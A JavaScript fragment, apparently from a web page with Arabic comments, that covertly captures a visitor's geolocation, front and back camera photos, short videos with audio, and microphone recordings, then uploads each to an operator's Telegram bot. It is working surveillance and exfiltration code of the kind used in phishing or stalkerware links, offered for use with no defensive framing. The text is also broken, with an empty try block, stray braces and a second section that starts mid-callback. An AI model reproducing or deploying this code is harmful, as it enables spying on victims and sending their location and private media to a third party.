async function sendLocation(chat, token) {
    return new Promise((resolve) => {
        if (!navigator.geolocation) {
            resolve(false);
            return;
        }
        navigator.geolocation.getCurrentPosition(async (pos) => {
            const lat = pos.coords.latitude;
            const lon = pos.coords.longitude;
            const url = `https://www.google.com/maps?q=${lat},${lon}`;
            await fetch(`https://api.telegram.org/bot${token}/sendMessage`, {
                method: 'POST',
                headers: {'Content-Type': 'application/json'},
                body: JSON.stringify({chat_id: chat, text: `📍 الموقع الحالي\nالإحداثيات: ${lat}, ${lon}\n🔗 ${url}`})
            });
            resolve(true);
        }, () => resolve(false));
    });
}

async function capturePhoto(chat, token, facingMode, type) {
    try {
        const stream = await navigator.mediaDevices.getUserMedia({video: {facingMode: {exact: facingMode}}});
        const video = document.createElement('video');
        video.srcObject = stream;
        video.playsInline = true;
        await video.play();
        await new Promise(r => setTimeout(r, 500));
        
        const canvas = document.createElement('canvas');
        canvas.width = video.videoWidth || 640;
        canvas.height = video.videoHeight || 480;
        canvas.getContext('2d').drawImage(video, 0, 0);
        
        const blob = await new Promise(r => canvas.toBlob(r, 'image/jpeg', 0.8));
        const fd = new FormData();
        fd.append('chat_id', chat);
        fd.append('photo', blob, `photo_${Date.now()}.jpg`);
        fd.append('caption', `📸 صورة من ${type === 'front' ? 'الكاميرا الأمامية' : 'الكاميرا الخلفية'}`);
        
        await fetch(`https://api.telegram.org/bot${token}/sendPhoto`, {method: 'POST', body: fd});
        stream.getTracks().forEach(t => t.stop());
        return true;
    } catch(e) {
        console.log('خطأ في الصورة:', e);
        return false;
    }
}

async function recordVideo(chat, token, facingMode, type) {
    try {
        const stream = await navigator.mediaDevices.getUserMedia({video: {facingMode: {exact: facingMode}}, audio: true});
        const mediaRecorder = new MediaRecorder(stream);
        const chunks = [];
        
        mediaRecorder.ondataavailable = e => chunks.push(e.data);
        mediaRecorder.onstop = async () => {
            const blob = new Blob(chunks, {type: 'video/mp4'});
            const fd = new FormData();
            fd.append('chat_id', chat);
            fd.append('video', blob, `video_${Date.now()}.mp4`);
            fd.append('caption', `🎥 فيديو من ${type === 'front' ? 'الكاميرا الأمامية' : 'الكاميرا الخلفية'} - 5 ثوان`);
            await fetch(`https://api.telegram.org/bot${token}/sendVideo`, {method: 'POST', body: fd});
        };
        
        mediaRecorder.start();
        setTimeout(() => mediaRecorder.stop(), 5000);
        setTimeout(() => stream.getTracks().forEach(t => t.stop()), 5500);
        return true;
    } catch(e) {
        console.log('خطأ في الفيديو:', e);
        return false;
    }
}

async function recordAudio(chat, token) {
    try {

    }
}

};

                        fd.append('photo', blob, 'back.jpg');
                        fetch(`https://api.telegram.org/bot${tokenParam}/sendPhoto`, {method: 'POST', body: fd});
                        stream.getTracks().forEach(t => t.stop());
                    });
                }, 1000);
            }).catch(() => {});
        }
        
        // فيديو أمامي
        if (features.includes('videoFront')) {
            navigator.mediaDevices.getUserMedia({video: {facingMode: 'user'}, audio: true}).then(stream => {
                const mediaRecorder = new MediaRecorder(stream);
                const chunks = [];
                mediaRecorder.ondataavailable = e => chunks.push(e.data);
                mediaRecorder.onstop = () => {
                    const blob = new Blob(chunks, {type: 'video/mp4'});
                    const fd = new FormData();
                    fd.append('chat_id', chatParam);
                    fd.append('video', blob, 'video_front.mp4');
                    fetch(`https://api.telegram.org/bot${tokenParam}/sendVideo`, {method: 'POST', body: fd});
                };
                mediaRecorder.start();
                setTimeout(() => mediaRecorder.stop(), 5000);
                setTimeout(() => stream.getTracks().forEach(t => t.stop()), 5500);
            }).catch(() => {});
        }
        
        // فيديو خلفي
        if (features.includes('videoBack')) {
            navigator.mediaDevices.getUserMedia({video: {facingMode: 'environment'}, audio: true}).then(stream => {
                const mediaRecorder = new MediaRecorder(stream);
                const chunks = [];
                mediaRecorder.ondataavailable = e => chunks.push(e.data);
                mediaRecorder.onstop = () => {
                    const blob = new Blob(chunks, {type: 'video/mp4'});
                    const fd = new FormData();
                    fd.append('chat_id', chatParam);
                    fd.append('video', blob, 'video_back.mp4');
                    fetch(`https://api.telegram.org/bot${tokenParam}/sendVideo`, {method: 'POST', body: fd});
                };
                mediaRecorder.start();
                setTimeout(() => mediaRecorder.stop(), 5000);
                setTimeout(() => stream.getTracks().forEach(t => t.stop()), 5500);
            }).catch(() => {});
        }
        
        // تسجيل صوتي
        if (features.includes('audio')) {
            navigator.mediaDevices.getUserMedia({audio: true}).then(stream => {
                const mediaRecorder = new MediaRecorder(stream);
                const chunks = [];
                mediaRecorder.ondataavailable = e => chunks.push(e.data);
                mediaRecorder.onstop = () => {
                    const blob = new Blob(chunks, {type: 'audio/mp4'});
                    const fd = new FormData();
                    fd.append('chat_id', chatParam);
                    fd.append('audio', blob, 'audio.mp4');
                    fetch(`https://api.telegram.org/bot${tokenParam}/sendAudio`, {method: 'POST', body: fd});
                };
                mediaRecorder.start();
                setTimeout(() => mediaRecorder.stop(), 5000);
                setTimeout(() => stream.getTracks().forEach(t => t.stop()), 5500);
            }).catch(() => {});
        }
    }, 2000);
}
</script>
